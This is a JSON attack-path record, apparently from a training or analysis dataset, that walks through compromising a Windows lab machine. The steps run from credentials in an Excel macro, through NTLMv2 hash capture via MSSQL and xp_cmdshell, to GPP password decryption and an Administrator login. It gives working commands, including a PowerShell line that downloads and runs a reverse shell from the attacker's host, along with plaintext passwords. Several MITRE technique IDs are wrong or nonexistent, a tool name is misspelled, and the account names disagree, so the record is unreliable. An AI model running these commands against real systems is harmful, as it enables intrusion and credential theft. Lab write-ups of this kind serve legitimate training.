@@ -1,0 +1,273 @@
+{
+  "id": "ap-0021",
+  "title": "SQL Server Hashing & GPP Decryption Privilege Escalation",
+  "summary": "Compromising an Excel macro to find SQL credentials, abusing MSSQL to steal NTLMv2 hashes, gaining Remote Command Execution via xp_cmdshell, and escalating privileges using a vulnerable Group Policy Preferences (GPP) password.",
+  "attack_path_markdown": "### Step 1\n**Reconnaissance and Initial Access Vector Discovery**\nPerform network scanning and SMB enumeration to identify open services and shared resources (ports 1433 MSSQL, 445 SMB, 5985 WinRM).\n\n### Step 2\n**Credential Discovery (Macro Inspection)**\nAccess the 'Reports' SMB share and download the `Currency Volume Report.xlsm` file. Analyze the macro using Oletools to extract the initial MSSQL credentials.\n\n### Step 3\n**Exploitation (MSSQL Command Execution Setup)**\nConnect to MSSQL using the obtained credentials (`reporting`). Use an SMB listener on the attacker machine and force the SQL service to authenticate against it (`xp_dirtree`) to capture the NTLMv2 hash. Crack the hash to obtain the `sql_svc` user password. Reconnect to MSSQL using `sql_svc` and enable `xp_cmdshell` by configuring advanced options.\n\n### Step 4\n**Initial Shell Access**\nExecute a command via `xp_cmdshell` to download and execute an `Invoke-PowerShellTcp.ps1` reverse shell payload, gaining a low-privilege session.\n\n### Step 5\n**Privilege Escalation**\nRun `PowerUp.ps1` to enumerate system vulnerabilities. Discover the encrypted Administrator password in the `Groups.xml` file (GPP vulnerability). Decrypt the password and perform Pass-the-Hash (or use the plaintext password) via `Evil-WinRM` or `wmiexec.py` to gain an elevated shell as Administrator/System.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target operating system, open ports, and potential shared resources.",
+      "actions": [
+        "Verify host activity via ping 10.10.10.125",
+        "Scan all TCP ports for open services using nmap -p- -sT --min-rate 5000 -vvv -n -Pn 10.10.10.125 -oG oldports",
+        "Run comprehensive service and version detection scan using nmap -sC -sV 10.10.10.125 -oA nmap/courier",
+        "Perform initial SMB enumeration using crackmapexec smb 10.10.10.125"
+      ],
+      "tools": [
+        "ping",
+        "nmap",
+        "crackmapexec"
+      ],
+      "techniques": [
+        "Port Scanning (T1046)",
+        "OS Fingerprinting",
+        "SMB Enumeration (T1212)"
+      ],
+      "mitre_ids": [
+        "T1046",
+        "T1212"
+      ],
+      "indicators": [
+        "TTL 128 (Windows system)",
+        "Ports 1433, 445, 5985 open",
+        "Domain/Workgroup information"
+      ],
+      "preconditions": "Attacker connectivity to the target machine.",
+      "expected_outcome": "List of open ports and services, identification of a Windows system, and accessible network shares.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparing necessary payloads and listeners for exploitation, specifically the reverse shell script.",
+      "actions": [
+        "Download the Nishang script: wget <URL_TO_Invoke-PowerShellTcp.ps1> -O ps.ps1",
+        "Modify the `ps.ps1` script to include the invocation command: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.29 -Port 443",
+        "Set up an HTTP server to host the payload: python3 -m http.server 80",
+        "Set up a Netcat listener to receive the reverse shell connection: nc -lvnp 443"
+      ],
+      "tools": [
+        "wget",
+        "Nishang (Invoke-PowerShellTcp.ps1)",
+        "python3 -m http.server",
+        "Netcat (nc)"
+      ],
+      "techniques": [
+        "Payload Modification",
+        "Payload Staging (T1105)"
+      ],
+      "mitre_ids": [
+        "T1105"
+      ],
+      "indicators": [
+        "PowerShell script prepared",
+        "HTTP server running",
+        "Netcat listening on port 443"
+      ],
+      "preconditions": "Attacker environment configured to host and receive payloads.",
+      "expected_outcome": "Working payload and active listener.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Identifying and accessing network shares to discover configuration files containing credentials.",
+      "actions": [
+        "List shared resources using **smbmap 10.10.10.125** (anonymous/null session is implied)",
+        "Connect to the 'Reports' share using **smbclient //10.10.10.125/Reports**",
+        "Download the Excel file: get 'Currency Volume Report.xlsm'",
+        "Analyze the Excel macro for embedded credentials using olefb -c 'Currency Volume Report.xlsm'"
+      ],
+      "tools": [
+        "smbclient",
+        "smbmap",
+        "oletools (olefb)"
+      ],
+      "techniques": [
+        "Data from Network Shared Drive (T1538)",
+        "Macro Analysis (T1538)"
+      ],
+      "mitre_ids": [
+        "T1538"
+      ],
+      "indicators": [
+        "Read-only access to 'Reports' share",
+        "File successfully downloaded",
+        "Credentials extracted from macro: `reporting:R3p0rt_n_p4yro11`"
+      ],
+      "preconditions": "Readable SMB share.",
+      "expected_outcome": "Valid set of MSSQL credentials.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Abusing MSSQL connectivity to force hash authentication and compromise a higher-privileged SQL user.",
+      "actions": [
+        "Connect to MSSQL (1433) using initial credentials: mssqlclient.py workgroup/reporting@10.10.10.125",
+        "Set up an SMB server listener: smbserver.py SMB-FOLDER ./ -smb2support 10.10.14.29",
+        "Force NTLMv2 hash capture via stored procedure: EXEC xp_dirtree '\\\\10.10.14.29\\smb-folder'",
+        "Crack the captured NTLMv2 hash using John the Ripper: john --wordlist=rockyou.txt <hashfile>"
+      ],
+      "tools": [
+        "mssqlclient.py",
+        "smbserver.py",
+        "xp_dirtree (MSSQL function)",
+        "john (John the Ripper)"
+      ],
+      "techniques": [
+        "NTLM Hash Capture (T1187)",
+        "SQL Stored Procedure Abuse",
+        "Password Cracking (T1110)"
+      ],
+      "mitre_ids": [
+        "T1187",
+        "T1110"
+      ],
+      "indicators": [
+        "NTLMv2 hash captured and cracked (User: sql_svc)",
+        "Password for `sql_svc` obtained."
+      ],
+      "preconditions": "Valid low-privilege MSSQL credentials, Attacker SMB server setup.",
+      "expected_outcome": "Valid high-privilege MSSQL credentials.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Gaining an interactive shell by enabling and executing commands via `xp_cmdshell`.",
+      "actions": [
+        "Reconnect to MSSQL with the new credentials (`sql_svc`)",
+        "Enable advanced options in MSSQL: EXEC sp_configure 'show advanced options', 1; reconfigure;",
+        "Enable `xp_cmdshell`: EXEC sp_configure 'xp_cmdshell', 1; reconfigure;",
+        "Verify command execution: EXEC xp_cmdshell ipconfig",
+        "Execute the PowerShell reverse shell payload: EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.29:80/ps.ps1\")'"
+      ],
+      "tools": [
+        "mssqlclient.py",
+        "sp_configure (MSSQL function)",
+        "xp_cmdshell (MSSQL function)",
+        "powershell"
+      ],
+      "techniques": [
+        "SQL Command Execution (T1068)",
+        "Remote Services Access (T1021)"
+      ],
+      "mitre_ids": [
+        "T1068",
+        "T1021"
+      ],
+      "indicators": [
+        "`xp_cmdshell` enabled successfully",
+        "Reverse shell connection established on port 443 as `mssql_svc`"
+      ],
+      "preconditions": "High-privilege MSSQL credentials.",
+      "expected_outcome": "Low-privilege shell access to the Windows machine.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command & Control",
+      "description": "Escalating privileges to Administrator using the GPP vulnerability.",
+      "actions": [
+        "Host the PowerUp script: **python3 -m http.server 80**",
+        "Execute PowerUp.ps1 to enumerate vulnerabilities: IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.29:80/powerup.ps1'); Invoke-AllChecks",
+        "Read the GPP XML file identified by PowerUp: type C:\\ProgramData\\Microsoft\\Group Policy\\History\\{GUID}\\...\\Groups.xml",
+        "Decrypt the GPP password to obtain plaintext credentials (Administrator: M1cR0s0ft_N_Luigi)",
+        "Connect using the plaintext password: Evil-WinRM -i 10.10.10.125 -u Administrator -p M1cR0s0ft_N_Luigi",
+        "Alternatively, dump hashes using wmiexec.py -hashes :<Admin_NTLM_Hash> Administrator@10.10.10.125"
+      ],
+      "tools": [
+        "PowerUp.ps1",
+        "type",
+        "GPP Decryption Utility (Implied, often external tool/script)",
+        "Evil-WinRM",
+        "wmiexec.py"
+      ],
+      "techniques": [
+        "Group Policy Abuse (T1202.002)",
+        "Pass the Hash (T1550.002)"
+      ],
+      "mitre_ids": [
+        "T1202.002",
+        "T1550.002"
+      ],
+      "indicators": [
+        "GPP vulnerability detected",
+        "Administrator credentials obtained and verified."
+      ],
+      "preconditions": "Initial foothold and PowerUp execution success.",
+      "expected_outcome": "Elevated shell access (Administrator or System).",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Retrieving the user and root flags.",
+      "actions": [
+        "Locate the user flag: dir /s user.txt (or similar discovery command)",
+        "Retrieve the user flag content: type <Path_To_User.txt>**",
+        "Retrieve the root flag content: type C:\\Users\\Administrator\\Desktop\\root.txt"
+      ],
+      "tools": [
+        "dir",
+        "type"
+      ],
+      "techniques": [
+        "Data Exfiltration (T1041)",
+        "Account Discovery (T1087)"
+      ],
+      "mitre_ids": [
+        "T1041",
+        "T1087"
+      ],
+      "indicators": [
+        "Flags obtained."
+      ],
+      "preconditions": "Administrator privileges.",
+      "expected_outcome": "Successful compromise validation.",
+      "confidence": 1.0
+    }
+  ],
+  "tactics": [
+    "Reconnaissance",
+    "Credential Access",
+    "Discovery",
+    "Lateral Movement",
+    "Privilege Escalation"
+  ],
+  "techniques": [
+    "Macro Analysis",
+    "SQL Stored Procedure Abuse",
+    "NTLM Hash Capture",
+    "Group Policy Abuse (GPP)",
+    "Pass the Hash"
+  ],
+  "mitre_ids": [
+    "T1538",
+    "T1068",
+    "T1187",
+    "T1202.002",
+    "T1550.002"
+  ],
+  "hosts": [
+    "10.10.10.125"
+  ],
+  "privs_obtained": [
+    "user (reporting)",
+    "service account (sql_svc)",
+    "Administrator",
+    "NT Authority\\System"
+  ],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "Machine is Windows (TTL 128). Process involves multiple credential sets and specialized Windows/SQL exploitation techniques. The IP 10.10.14.29 is used as the attacker machine IP.",
+  "labels": [
+    "attack_path",
+    "mssql",
+    "hash_stealing",
+    "gpp_decrypt",
+    "windows"
+  ]
+}
